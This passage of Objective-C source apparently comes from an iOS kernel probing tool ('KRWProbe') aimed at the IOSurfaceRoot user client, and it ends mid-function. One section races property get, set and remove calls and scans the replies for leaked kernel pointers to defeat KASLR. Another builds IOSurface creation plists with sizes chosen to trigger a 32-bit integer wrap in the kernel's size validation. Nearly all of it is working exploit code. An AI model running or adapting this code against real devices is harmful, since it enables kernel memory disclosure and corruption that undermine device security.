// hard_scan_ptrs() treated every 64-bit word >= 0xffff000000000000 as
// "kernel-like".  LEAK re-runs the same sel 10 get path under controlled
// conditions and records the actual bytes, so a value can be classified:
//   0xfffffff007004000 .. 0xfffffff00aa78000 -> unslid kernel text/data
//   0xffffffff80000000 .. 0xffffffffffffffff -> top32=0xffffffff, i.e. a
//                                                sign-extended 32-bit value
//                                                (0x84000040 -> ffffffff84000040)
// The scan walks every 4-byte offset.  A matching 64-bit value at an offset
// that is not 8-byte aligned spans two 32-bit fields and is marked align=4.

#define LEAK_SINGLE_ITERS 200000L
#define LEAK_THREADS      4
#define LEAK_THREAD_ITERS 200000L
#define LEAK_SCALAR_ITERS 20000L
#define LEAK_GET_OUT      0x800u
#define LEAK_IN_SIZE      0x14u          // 0xc header + "LEAKKEY\0"
#define LEAK_MAX_DUMPS    200
#define LEAK_MAX_HITS     16
#define LEAK_TEXT_LO      0xfffffff007004000ULL
#define LEAK_TEXT_HI      0xfffffff00aa78000ULL
#define LEAK_FF8_LO       0xffffffff80000000ULL

static NSLock *gLeakLock;
static FILE *gLeakFile;
static volatile int gLeakBusy;
static volatile int gLeakChurnStop;
static long gLeakCalls;            // sel 10 calls in this LEAK run
static long gLeakHitResponses;     // responses with >= 1 matching value
static long gLeakPtrValues;        // matching 64-bit values
static long gLeakDumpCount;        // dump records written (<= LEAK_MAX_DUMPS)
static long gLeakCapLogged;
static long gLeakChurnOps;
static long gLeakChurnErrors;

typedef struct {
    uint64_t value;
    size_t   off;
    int      scalar;               // 1 => off indexes scalarOut[]
    int      align;                // 8, or 4 for an unaligned 64-bit read
} LeakHit;

static BOOL leak_ptr_like(uint64_t v) {
    if (v == 0 || v == 0xffffffffffffffffULL) return NO;
    if ((v >> 40) == 0xffffffULL) return YES;        // top 24 bits 0xffffff
    if ((v >> 32) == 0xffffffffULL) return YES;      // top 32 bits 0xffffffff
    if (v >= 0xffff000000000000ULL) return YES;      // 1.5 HARD's original bound
    return NO;
}

// text_range compares against the *unslid* kernel text/data window; a slid
// pointer will not match it, so the class name says "unslid range".
static NSString *leak_classify(uint64_t v, BOOL *inText, BOOL *inFF8) {
    *inText = (v >= LEAK_TEXT_LO && v <= LEAK_TEXT_HI);
    *inFF8  = (v >= LEAK_FF8_LO);
    if (*inText) return @"KERNEL-TEXT/DATA (unslid range)";
    if (v >= 0xfffffff000000000ULL && v < 0xffffffff00000000ULL)
        return @"0xfffffff0... (kernel range, possibly KASLR-slid)";
    if (*inFF8)  return @"0xffffffff8... (sign-extended 32-bit, NOT text)";
    if ((v >> 32) == 0xffffffffULL)
        return @"0xffffffff0... (top32 all ones, NOT text)";
    if ((v >> 40) == 0xffffffULL)
        return @"0xffffff... (top24 all ones, NOT text)";
    return @"0xffff... other (e.g. 0xfffffe... heap, outside text)";
}

static void leak_emit(NSString *text) {
    if (!text.length) return;
    if (!gLeakLock) gLeakLock = [[NSLock alloc] init];
    NSString *t = [text stringByTrimmingCharactersInSet:
                   [NSCharacterSet newlineCharacterSet]];
    if (!t.length) return;
    [gLeakLock lock];
    if (gLeakFile) {
        const char *u = t.UTF8String;
        if (u) {
            fwrite(u, 1, strlen(u), gLeakFile);
            fputc('\n', gLeakFile);
            fflush(gLeakFile);              // every block is on disk immediately
        }
    }
    L(@"%@", t);                            // screen + run.log
    [gLeakLock unlock];
}

static int leak_scan(const uint8_t *p, size_t n, int scalar,
                     LeakHit *hits, int maxHits, size_t *total) {
    int nh = 0;
    if (!p) return 0;
    for (size_t off = 0; off + 8 <= n; off += 4) {
        uint64_t v;
        memcpy(&v, p + off, 8);
        if (!leak_ptr_like(v)) continue;
        if (total) (*total)++;
        if (nh < maxHits) {
            hits[nh].value  = v;
            hits[nh].off    = off;
            hits[nh].scalar = scalar;
            hits[nh].align  = ((off & 7) == 0) ? 8 : 4;
            nh++;
        }
    }
    return nh;
}

static BOOL leak_claim_dump(long *slot) {
    BOOL ok = NO;
    if (!gLeakLock) gLeakLock = [[NSLock alloc] init];
    [gLeakLock lock];
    if (gLeakDumpCount < LEAK_MAX_DUMPS) {
        *slot = gLeakDumpCount++;
        ok = YES;
    }
    [gLeakLock unlock];
    if (!ok && __sync_bool_compare_and_swap(&gLeakCapLogged, 0L, 1L)) {
        L(@"[LEAK] dump cap reached (%d records); further hits counted only",
          LEAK_MAX_DUMPS);
    }
    return ok;
}

// One dump record: metadata + every matching value + first 128 bytes.
static void leak_report(long iter, int tid, kern_return_t kr,
                        const uint8_t *out, size_t outSize,
                        const uint64_t *sc, uint32_t scCnt) {
    LeakHit hits[LEAK_MAX_HITS];
    size_t total = 0;
    int nh = leak_scan(out, outSize, 0, hits, LEAK_MAX_HITS, &total);
    if (sc && scCnt) {
        LeakHit sh[4];
        size_t st = 0;
        int ns = leak_scan((const uint8_t *)sc, (size_t)scCnt * 8, 1,
                           sh, 4, &st);
        for (int i = 0; i < ns && nh < LEAK_MAX_HITS; i++) hits[nh++] = sh[i];
        total += st;
    }
    if (total == 0) return;

    __sync_fetch_and_add(&gLeakHitResponses, 1);
    __sync_fetch_and_add(&gLeakPtrValues, (long)total);

    long slot = 0;
    if (!leak_claim_dump(&slot)) return;

    NSMutableString *s = [NSMutableString stringWithCapacity:4096];
    [s appendFormat:@"[LEAK] dump #%ld iter=%ld tid=%d sel=10 kr=0x%x "
                    "structOut=%zu scalarOut=%u hits=%zu\n",
                    slot + 1, iter, tid, kr, outSize, scCnt, total];
    for (int i = 0; i < nh; i++) {
        BOOL inText = NO, inFF8 = NO;
        NSString *cls = leak_classify(hits[i].value, &inText, &inFF8);
        uint32_t lo = (uint32_t)hits[i].value;
        uint32_t hi = (uint32_t)(hits[i].value >> 32);
        if (hits[i].scalar) {
            [s appendFormat:@"  hit[%d] scalar[%zu] value=0x%016llx lo32=0x%08x "
                            "hi32=0x%08x text_range=%s ffffffff8_range=%s class=%@\n",
                            i, hits[i].off / 8,
                            (unsigned long long)hits[i].value, lo, hi,
                            inText ? "YES" : "NO", inFF8 ? "YES" : "NO", cls];
        } else {
            [s appendFormat:@"  hit[%d] off=+0x%zx align=%d value=0x%016llx "
                            "lo32=0x%08x hi32=0x%08x text_range=%s "
                            "ffffffff8_range=%s class=%@%s\n",
                            i, hits[i].off, hits[i].align,
                            (unsigned long long)hits[i].value, lo, hi,
                            inText ? "YES" : "NO", inFF8 ? "YES" : "NO", cls,
                            hits[i].align == 4 ?
                                " [UNALIGNED64: spans two 32-bit fields]" : ""];
        }
    }
    if (total > (size_t)nh)
        [s appendFormat:@"  (+%zu matching values not listed; max %d/response)\n",
                        total - (size_t)nh, LEAK_MAX_HITS];
    [s appendFormat:@"  structOut[0x00..0x80] (actual structOut=%zu; "
                    "buffer zeroed before the call):\n%@",
                    outSize, hexdump_lines(out, 0x80)];
    if (outSize < 0x80)
        [s appendString:@"  note: bytes past structOut are the zeroed buffer\n"];
    if (sc && scCnt) {
        [s appendString:@"  scalarOut:"];
        for (uint32_t i = 0; i < scCnt; i++)
            [s appendFormat:@" [%u]=0x%016llx", i,
                            (unsigned long long)sc[i]];
        [s appendString:@"\n"];
    }
    leak_emit(s);
}

// sel 10 get loop.  scalarCap=NO matches the 1.5 race exactly (NULL scalarOut);
// scalarCap=YES passes a 4-entry scalarOut buffer and scans it too.
static void leak_get_loop(io_connect_t conn, uint32_t sid, int tid, long iters,
                          BOOL scalarCap, const char *tag) {
    uint8_t in[LEAK_IN_SIZE];
    uint8_t *out = (uint8_t *)calloc(1, LEAK_GET_OUT);
    if (!out) { L(@"[LEAK] %s tid=%d: output alloc failed", tag, tid); return; }
    memset(in, 0, sizeof(in));
    memcpy(in, &sid, sizeof(sid));                 // +0x00 surface id
    memcpy(in + 0xc, "LEAKKEY", 8);                // +0x0c C-string key + NUL

    long local = 0;
    for (long i = 0; i < iters && !gStop; i++) {
        @autoreleasepool {
            uint64_t sc[4] = { 0, 0, 0, 0 };
            uint32_t scCnt = scalarCap ? 4u : 0u;
            size_t osz = LEAK_GET_OUT;
            memset(out, 0, LEAK_GET_OUT);          // no stale pointer bytes
            long iter = __sync_fetch_and_add(&gLeakCalls, 1);
            kern_return_t kr;
            if (scalarCap) {
                kr = IOConnectCallMethod(conn, 10, NULL, 0, in, sizeof(in),
                                         sc, &scCnt, out, &osz);
            } else {
                kr = IOConnectCallMethod(conn, 10, NULL, 0, in, sizeof(in),
                                         NULL, NULL, out, &osz);
            }
            if (osz > LEAK_GET_OUT) osz = LEAK_GET_OUT;
            if (scCnt > 4) scCnt = 4;
            leak_report(iter, tid, kr, out, osz, sc, scCnt);
            local++;
            if (local % 50000 == 0) {
                set_phase(@"LEAK/%s tid=%d %ld/%ld", tag, tid, local, iters);
                L(@"[LEAK] %s tid=%d %ld/%ld calls=%ld hit_resp=%ld ptr_vals=%ld",
                  tag, tid, local, iters, gLeakCalls,
                  gLeakHitResponses, gLeakPtrValues);
            }
        }
    }
    free(out);
}

// Concurrent sel 9 / sel 11 on LEAKKEY for the raced phase.  This recreates
// the 1.5 race shape: readers on sel 10 while the property is replaced and
// removed.  Value alternates 1 / 0xffffffff.
static void leak_churn_thread(io_connect_t conn, uint32_t sid) {
    uint8_t *in = (uint8_t *)calloc(1, 0x200);
    if (!in) return;
    unsigned long n = 0;
    while (!gStop && !gLeakChurnStop) {
        @autoreleasepool {
            memset(in, 0, 0x200);
            memcpy(in, &sid, sizeof(sid));
            kern_return_t kr;
            size_t isz;
            if ((n & 1) == 0) {                    // sel 9 SET
                char pl[192];
                unsigned long long val = (n & 2) ? 0xffffffffULL : 1ULL;
                int plen = snprintf(pl, sizeof(pl),
                    "<plist version=\"1.0\"><array><integer>%llu</integer>"
                    "<string>LEAKKEY</string></array></plist>", val);
                if (plen < 0) plen = 0;
                if ((size_t)plen >= sizeof(pl)) plen = (int)sizeof(pl) - 1;
                isz = 0xc + (size_t)plen + 1;
                memcpy(in + 0xc, pl, (size_t)plen + 1);
                uint32_t v = 0; size_t vs = sizeof(v);
                kr = IOConnectCallMethod(conn, 9, NULL, 0, in, isz,
                                         NULL, NULL, &v, &vs);
            } else {                               // sel 11 REMOVE
                memcpy(in + 0xc, "LEAKKEY", 8);
                isz = 0xc + 8;
                uint32_t v = 0; size_t vs = sizeof(v);
                kr = IOConnectCallMethod(conn, 11, NULL, 0, in, isz,
                                         NULL, NULL, &v, &vs);
            }
            if (kr != KERN_SUCCESS) __sync_fetch_and_add(&gLeakChurnErrors, 1);
            __sync_fetch_and_add(&gLeakChurnOps, 1);
            n++;
        }
    }
    free(in);
}

static io_connect_t leak_open_conn(void) {
    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                   IOServiceMatching("IOSurfaceRoot"));
    if (!svc) { L(@"[LEAK] no IOSurfaceRoot service"); return 0; }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) {
        L(@"[LEAK] IOServiceOpen kr=0x%x (%u) FAIL", kr, kr);
        return 0;
    }
    return conn;
}

static void leak_loop_inner(void) {
    if (!gLeakLock) gLeakLock = [[NSLock alloc] init];

    // Per-run counters and dump cap.
    gLeakCalls = 0;
    gLeakHitResponses = 0;
    gLeakPtrValues = 0;
    gLeakDumpCount = 0;
    gLeakCapLogged = 0;
    gLeakChurnOps = 0;
    gLeakChurnErrors = 0;
    gLeakChurnStop = 0;

    if (!gLeakPath && gRunDir)
        gLeakPath = [gRunDir stringByAppendingPathComponent:@"leak.txt"];
    gLeakFile = gLeakPath ?
        fopen(gLeakPath.fileSystemRepresentation, "a") : NULL;
    if (gLeakFile) {
        setvbuf(gLeakFile, NULL, _IOLBF, 0);
    } else {
        L(@"[LEAK] fopen %@ failed: %s (screen log only)",
          gLeakPath ?: @"(nil)", strerror(errno));
    }

    set_phase(@"LEAK setup (sel0 create + sel9 set)");
    leak_emit([NSString stringWithFormat:
        @"[LEAK] === KRWProbe %@ LEAK run %@ ===\n"
         "[LEAK] key=LEAKKEY get=sel10 structIn=0x%x (0xc header + C-string)\n"
         "[LEAK] plan: single=%ld, raced=%d x %ld (+sel9/sel11 churn), scalar=%ld\n"
         "[LEAK] unslid kernel text/data range: [0x%016llx, 0x%016llx]\n"
         "[LEAK] 0xffffffff8... = top32 0xffffffff, i.e. sign-extended 32-bit\n"
         "[LEAK] dump cap=%d records; each dump includes structOut[0x00..0x80]",
        app_version(), [NSDate date], LEAK_IN_SIZE,
        LEAK_SINGLE_ITERS, LEAK_THREADS, LEAK_THREAD_ITERS, LEAK_SCALAR_ITERS,
        LEAK_TEXT_LO, LEAK_TEXT_HI, LEAK_MAX_DUMPS]);

    io_connect_t conn = leak_open_conn();
    if (!conn) {
        if (gLeakFile) { fclose(gLeakFile); gLeakFile = NULL; }
        return;
    }

    uint8_t *info = (uint8_t *)calloc(1, IOSURFACE_INFO_SIZE);
    uint8_t *out = (uint8_t *)calloc(1, LEAK_GET_OUT);
    if (!info || !out) {
        L(@"[LEAK] buffer alloc failed (info=%p out=%p)", info, out);
        free(info); free(out);
        IOServiceClose(conn);
        if (gLeakFile) { fclose(gLeakFile); gLeakFile = NULL; }
        return;
    }

    // ---- 1) sel 0 CREATE: 1 scalar parent=0, XML+NUL, structOut 0xc68 ----
    NSString *xml = create_surface_xml();
    const char *xc = xml.UTF8String;
    size_t xlen = xc ? strlen(xc) + 1 : 0;         // kernel needs trailing NUL
    uint64_t scIn[1] = { 0 };                       // parent id = 0
    size_t infoSize = IOSURFACE_INFO_SIZE;
    memset(info, 0, IOSURFACE_INFO_SIZE);
    kern_return_t kr = IOConnectCallMethod(conn, 0, scIn, 1, xc, xlen,
                                           NULL, NULL, info, &infoSize);
    if (infoSize > IOSURFACE_INFO_SIZE) infoSize = IOSURFACE_INFO_SIZE;
    uint32_t sid = (kr == KERN_SUCCESS && infoSize >= IOSURFACE_INFO_ID_OFF + 4)
                 ? rd32(info + IOSURFACE_INFO_ID_OFF) : 0;

    size_t headerHits = 0;
    leak_scan(info, MIN(infoSize, (size_t)0x98), 0, NULL, 0, &headerHits);
    leak_emit([NSString stringWithFormat:
        @"[LEAK] CREATE sel0: scalarIn=1 {parent=0}, structIn=%zu (XML+NUL), "
         "structOut=%zu/0x%x -> kr=0x%x (%u) %s, id=%u (+0x%x)\n"
         "[LEAK] CREATE response header (first 0x98 bytes of 0xc68):\n%@"
         "[LEAK] CREATE header scan: ptr_like=%zu (reference only)",
        xlen, infoSize, IOSURFACE_INFO_SIZE, kr, kr,
        kr == KERN_SUCCESS ? "OK" : "FAIL", sid, IOSURFACE_INFO_ID_OFF,
        hexdump_lines(info, 0x98), headerHits]);
    if (kr != KERN_SUCCESS || sid == 0) {
        L(@"[LEAK] create failed; stopping");
        free(info); free(out); IOServiceClose(conn);
        if (gLeakFile) { fclose(gLeakFile); gLeakFile = NULL; }
        return;
    }

    // ---- 2) sel 9 SET: 0xc header + [1, "LEAKKEY"] XML plist ----
    const char *setXml =
        "<plist version=\"1.0\"><array><integer>1</integer>"
        "<string>LEAKKEY</string></array></plist>";
    size_t setLen = strlen(setXml) + 1;
    size_t in9Size = 0xc + setLen;
    uint8_t *in9 = (uint8_t *)calloc(1, in9Size);
    if (!in9) {
        L(@"[LEAK] sel9 alloc failed");
        free(info); free(out); IOServiceClose(conn);
        if (gLeakFile) { fclose(gLeakFile); gLeakFile = NULL; }
        return;
    }
    memcpy(in9, &sid, sizeof(sid));
    memcpy(in9 + 0xc, setXml, setLen);
    uint32_t sval = 0;
    size_t svalSize = sizeof(sval);
    kr = IOConnectCallMethod(conn, 9, NULL, 0, in9, in9Size,
                             NULL, NULL, &sval, &svalSize);
    leak_emit([NSString stringWithFormat:
        @"[LEAK] sel9 SET 'LEAKKEY'=1 -> kr=0x%x (%u) %s, structIn=%zu, "
         "structOut=%zu/4 value=%u",
        kr, kr, kr == KERN_SUCCESS ? "OK" : "FAIL", in9Size,
        svalSize, sval]);
    free(in9);
    if (kr != KERN_SUCCESS) {
        L(@"[LEAK] set failed; stopping");
        free(info); free(out); IOServiceClose(conn);
        if (gLeakFile) { fclose(gLeakFile); gLeakFile = NULL; }
        return;
    }

    // ---- 3) baseline sel 10 GET: prove what the normal answer looks like ----
    uint8_t in10[LEAK_IN_SIZE];
    memset(in10, 0, sizeof(in10));
    memcpy(in10, &sid, sizeof(sid));
    memcpy(in10 + 0xc, "LEAKKEY", 8);
    memset(out, 0, LEAK_GET_OUT);
    size_t osz = LEAK_GET_OUT;
    long baseIter = __sync_fetch_and_add(&gLeakCalls, 1);
    kr = IOConnectCallMethod(conn, 10, NULL, 0, in10, sizeof(in10),
                             NULL, NULL, out, &osz);
    if (osz > LEAK_GET_OUT) osz = LEAK_GET_OUT;
    leak_emit([NSString stringWithFormat:
        @"[LEAK] baseline sel10 GET -> kr=0x%x (%u) %s, structIn=%zu, "
         "structOut=%zu\n[LEAK] baseline structOut[0x00..0x80]:\n%@",
        kr, kr, kr == KERN_SUCCESS ? "OK" : "FAIL", sizeof(in10), osz,
        hexdump_lines(out, 0x80)]);
    leak_report(baseIter, 0, kr, out, osz, NULL, 0);

    // ---- 4) phase A: 200k single-threaded gets ----
    if (!gStop) {
        set_phase(@"LEAK/A single %ld sel10", LEAK_SINGLE_ITERS);
        L(@"[LEAK] A start: single-threaded %ld sel 10 gets (key LEAKKEY)",
          LEAK_SINGLE_ITERS);
        leak_get_loop(conn, sid, 0, LEAK_SINGLE_ITERS, NO, "A");
        L(@"[LEAK] A done: calls=%ld hit_resp=%ld ptr_vals=%ld dumps=%ld",
          gLeakCalls, gLeakHitResponses, gLeakPtrValues, gLeakDumpCount);
    }

    // ---- 5) phase B: 4 x 200k gets with sel 9/11 churn ----
    if (!gStop) {
        set_phase(@"LEAK/B raced %dx%ld sel10 + churn",
                  LEAK_THREADS, LEAK_THREAD_ITERS);
        L(@"[LEAK] B start: %d reader threads x %ld sel 10 + 1 sel9/sel11 churn",
          LEAK_THREADS, LEAK_THREAD_ITERS);
        gLeakChurnStop = 0;
        dispatch_group_t gReaders = dispatch_group_create();
        dispatch_group_t gChurn = dispatch_group_create();
        dispatch_queue_t q = dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0);
        for (int t = 0; t < LEAK_THREADS; t++) {
            dispatch_group_async(gReaders, q, ^{
                leak_get_loop(conn, sid, t, LEAK_THREAD_ITERS, NO, "B");
            });
        }
        dispatch_group_async(gChurn, q, ^{ leak_churn_thread(conn, sid); });
        dispatch_group_wait(gReaders, DISPATCH_TIME_FOREVER);
        gLeakChurnStop = 1;
        dispatch_group_wait(gChurn, DISPATCH_TIME_FOREVER);
        L(@"[LEAK] B done: calls=%ld hit_resp=%ld ptr_vals=%ld dumps=%ld "
          "churn_ops=%ld churn_err=%ld",
          gLeakCalls, gLeakHitResponses, gLeakPtrValues, gLeakDumpCount,
          gLeakChurnOps, gLeakChurnErrors);
    }

    // ---- 6) phase C: scalarOutput captured and scanned ----
    if (!gStop) {
        set_phase(@"LEAK/C scalarOut %ld sel10", LEAK_SCALAR_ITERS);
        L(@"[LEAK] C start: %ld sel 10 gets with a 4-entry scalarOut buffer",
          LEAK_SCALAR_ITERS);
        leak_get_loop(conn, sid, 0, LEAK_SCALAR_ITERS, YES, "C");
        L(@"[LEAK] C done: calls=%ld hit_resp=%ld ptr_vals=%ld dumps=%ld",
          gLeakCalls, gLeakHitResponses, gLeakPtrValues, gLeakDumpCount);
    }

    leak_emit([NSString stringWithFormat:
        @"[LEAK] summary: calls=%ld hit_responses=%ld ptr_values=%ld "
         "dump_records=%ld/%d churn_ops=%ld churn_err=%ld stop=%d\n"
         "[LEAK] leak.txt: %@",
        gLeakCalls, gLeakHitResponses, gLeakPtrValues,
        gLeakDumpCount, LEAK_MAX_DUMPS, gLeakChurnOps, gLeakChurnErrors,
        gStop, gLeakPath ?: @"(none)"]);

    free(info);
    free(out);
    IOServiceClose(conn);       // also releases the sel-0 surface
    if (gLeakFile) { fflush(gLeakFile); fclose(gLeakFile); gLeakFile = NULL; }
}

static void leak_loop(void) {
    if (gLeakBusy) { L(@"[LEAK] already running"); return; }
    gLeakBusy = 1;
    gStop = 0;
    @autoreleasepool { leak_loop_inner(); }
    gLeakBusy = 0;
}


// ---- F1: multi-slice compressed-plane 32-bit wrap (probe 1.7) ----
//
// VALIDATOR_AUDIT.md finding F1: fn_fffffff009c1af14.c l.1353-1363 validates
//
//   (DataRegionBytesPerSlice + HeaderRegionBytesPerSlice) * SliceCount
//       <= PlaneSize
//
// with a 32-bit add and a 32-bit multiply.  The shape below makes the wrapped
// product 0x10000 (= PlaneSize) while the true 64-bit region is 0x1_0001_0000
// (4 GiB + 64 KiB), so the check passes on the truncated value.
//
// The request is ONE hand-built sel 0 per variant, then sel 2 (info) and two
// sel 10 gets on the created surface.  Every variant writes its full 0xc68
// CREATE response (first 0x200 bytes + every non-zero u32 at a 4-byte offset)
// to <run>/f1.txt and to run.log.
//
// Constructive detail: the parser also requires the compressed tile header
// region (entry[2], XML "IOSurfacePlaneCompressedTileHeaderRegionOffset") to
// not overlap the slice-count-scaled data region (l.1316), so the header
// region offset is placed at dataRegionTotalSize*sliceCount.  With
// IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups = 0 the whole-plane
// header size term is 0 and the offset fits inside PlaneSize.  Without this
// the shape is rejected by the overlap check before line 1353.  XML integers
// are 64-bit (OSUnserializeXML.y: default `size = 64`), so 0x80000000 is NOT
// sign-extended by FUN_9c20038.

#define F1_INFO_SIZE    IOSURFACE_INFO_SIZE
#define F1_PLANE0_OFF   0x88u
#define F1_MAX_VARIANTS 5

static NSLock *gF1Lock;
static FILE *gF1File;
static NSString *gF1Path;
static volatile int gF1Busy;

typedef struct {
    const char *name;
    uint64_t sliceCount;
    uint64_t headerPerSlice;
    uint64_t planeSize;
    uint64_t allocSize;
    uint64_t headerRegionOffset;
    uint64_t dataPerSlice;
    uint64_t headerGroupsRow;
} F1Variant;

// One hand-built sel 0 per entry.  Variant 4 keeps alloc == planeSize because
// the planar allocation check (l.1912) requires AllocSize >= plane base+size;
// the audit's base shape already has AllocSize == PlaneSize == 0x10000.
static const F1Variant kF1Variants[] = {
    { "F1 base: slice=4 header=0x40000000 plane=0x10000",
      4,          0x40000000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x4000ULL, 0 },
    { "F1-B: slice=0x80000004 (same wrap, huge count)",
      0x80000004ULL, 0x40000000ULL, 0x10000ULL, 0x10000ULL, 0x10000ULL, 0x4000ULL, 0 },
    { "F1-C: header=0x80000000 slice=2",
      2,          0x80000000ULL, 0x10000ULL, 0x10000ULL, 0x8000ULL,  0x4000ULL, 0 },
    { "F1-D: plane=0x20000 (alloc follows plane)",
      4,          0x40000000ULL, 0x20000ULL, 0x20000ULL, 0x10000ULL, 0x4000ULL, 0 },
};
#define kF1VariantCount ((int)(sizeof(kF1Variants) / sizeof(kF1Variants[0])))

static void f1_emit(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *body = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (!body) body = @"(log format failed)";
    if (!gF1Lock) gF1Lock = [[NSLock alloc] init];
    [gF1Lock lock];
    if (gF1File) {
        const char *u = body.UTF8String;
        if (u) {
            fwrite(u, 1, strlen(u), gF1File);
            fputc('\n', gF1File);
            fflush(gF1File);
        }
    }
    L(@"%@", body);                    // screen + run.log (+ tmp mirror)
    [gF1Lock unlock];
}

static NSString *f1_xml(const F1Variant *v) {
    return [NSString stringWithFormat:
        @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
         "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
         "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
         "<plist version=\"1.0\"><dict>"
         "<key>IOSurfaceWidth</key><integer>64</integer>"
         "<key>IOSurfaceHeight</key><integer>64</integer>"
         "<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
         "<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
         "<key>IOSurfaceAllocSize</key><integer>%llu</integer>"
         "<key>IOSurfaceSliceCount</key><integer>%llu</integer>"
         "<key>IOSurfacePlaneInfo</key><array><dict>"
         "<key>IOSurfacePlaneWidth</key><integer>64</integer>"
         "<key>IOSurfacePlaneHeight</key><integer>64</integer>"
         "<key>IOSurfacePlaneBytesPerElement</key><integer>4</integer>"
         "<key>IOSurfacePlaneBytesPerRow</key><integer>512</integer>"
         "<key>IOSurfacePlaneSize</key><integer>%llu</integer>"
         "<key>IOSurfacePlaneCompressionType</key><integer>4</integer>"
         "<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>%llu</integer>"
         "<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>%llu</integer>"
         "<key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer>"
         "<key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer>"
         "<key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer>"
         "<key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer>"
         "<key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer>"
         "<key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer>"
         "<key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer>"
         "<key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>%llu</integer>"
         "<key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer>"
         "<key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>%llu</integer>"
         "</dict></array></dict></plist>\n",
        (unsigned long long)v->allocSize,
        (unsigned long long)v->sliceCount,
        (unsigned long long)v->planeSize,
        (unsigned long long)v->dataPerSlice,
        (unsigned long long)v->headerPerSlice,
        (unsigned long long)v->headerRegionOffset,
        (unsigned long long)v->headerGroupsRow];
}

// First 0x200 bytes plus every non-zero 32-bit word; enough to see the whole
// IOSurfaceInfo image (planes start at +0x88, stride 0x98).
static void f1_dump_response(const char *tag, const uint8_t *p, size_t n) {
    f1_emit(@"[F1] %s: first 0x200 bytes:\n%@", tag, hexdump_lines(p, 0x200));
    NSMutableString *s = [NSMutableString stringWithCapacity:4096];
    [s appendFormat:@"[F1] %s: non-zero u32 at 4-byte offsets (structOut=%zu):", tag, n];
    int shown = 0;
    for (size_t o = 0; o + 4 <= n; o += 4) {
        uint32_t v = rd32(p + o);
        if (!v) continue;
        [s appendFormat:@"\n  +0x%04zx = 0x%08x (%u)", o, v, v];
        shown++;
    }
    if (!shown) [s appendString:@" (none)"];
    f1_emit(@"%@", s);
}

// Key fields of IOSurfaceInfo: +0x58 planes, +0x74 sliceCount; per plane at
// +0x88 + i*0x98: +0x78 bytesPerTileData, +0x7c rowOfTileData, +0x80
// dataRegionBytesPerSlice, +0x84 headerRegionBytesPerSlice.
static void f1_info_fields(const char *tag, const uint8_t *info, size_t n) {
    if (n < 0x78) return;
    uint32_t planes = rd32(info + IOSURFACE_INFO_PLANES_OFF);
    uint32_t slice  = rd32(info + 0x74);
    f1_emit(@"[F1] %s: id=%u planes=%u (+0x58) sliceCount=0x%08x (%u) (+0x74) "
            "flag=%u pixfmt=0x%08x usecnt=%u",
            tag, rd32(info + IOSURFACE_INFO_ID_OFF), planes, slice, slice,
            info[IOSURFACE_INFO_FLAG_OFF], rd32(info + IOSURFACE_INFO_PIXFMT_OFF),
            rd32(info + IOSURFACE_INFO_USECNT_OFF));
    for (uint32_t i = 0; i < planes && i < 0x14; i++) {
        size_t off = F1_PLANE0_OFF + (size_t)i * 0x98;
        if (off + 0x88 > n) break;
        const uint8_t *pl = info + off;
        f1_emit(@"[F1] %s: plane[%u] @+0x%zx tileData(+0x78)=0x%08x tileRow(+0x7c)=0x%08x "
                "dataPerSlice(+0x80)=0x%08x headerPerSlice(+0x84)=0x%08x",
                tag, i, off, rd32(pl + 0x78), rd32(pl + 0x7c),
                rd32(pl + 0x80), rd32(pl + 0x84));
    }
}

// sel 2 + two sel 10 gets, exactly the shapes from probe_create().
static void f1_use_surface(io_connect_t conn, uint32_t sid, const char *label,
                           uint8_t *info, uint8_t *out, size_t outCap) {
    struct { uint32_t id; uint32_t flags; uint32_t pad; } in2 = { sid, 0, 0 };
    memset(info, 0xaa, F1_INFO_SIZE);
    size_t isz = F1_INFO_SIZE;
    kern_return_t kr = IOConnectCallMethod(conn, 2, NULL, 0, &in2, sizeof(in2),
                                           NULL, NULL, info, &isz);
    if (isz > F1_INFO_SIZE) isz = F1_INFO_SIZE;
    f1_emit(@"[F1] %s sel2 USE+INFO -> kr=0x%x (%u) %s structIn=%zu structOut=%zu/0xc68",
            label, kr, kr, kr == KERN_SUCCESS ? "OK" : "FAIL", sizeof(in2), isz);
    if (kr == KERN_SUCCESS) {
        f1_info_fields("sel2", info, isz);
        f1_dump_response("sel2 response", info, isz);
    }

    static const char *keys[] = { "IOSurfaceWidth", "IOSurfaceSliceCount" };
    for (int k = 0; k < 2; k++) {
        const char *key = keys[k];
        size_t klen = strlen(key) + 1;
        size_t insz = 0xc + klen;
        uint8_t *in10 = (uint8_t *)calloc(1, insz);
        if (!in10) { f1_emit(@"[F1] %s sel10 alloc failed", label); continue; }
        memcpy(in10, &sid, sizeof(sid));          // +0x00 surface id
        memcpy(in10 + 0xc, key, klen);            // +0x0c C-string key
        memset(out, 0, outCap);
        size_t osz = outCap;
        kr = IOConnectCallMethod(conn, 10, NULL, 0, in10, insz,
                                 NULL, NULL, out, &osz);
        if (osz > outCap) osz = outCap;
        f1_emit(@"[F1] %s sel10 GET '%s' -> kr=0x%x (%u) %s structIn=%zu structOut=%zu",
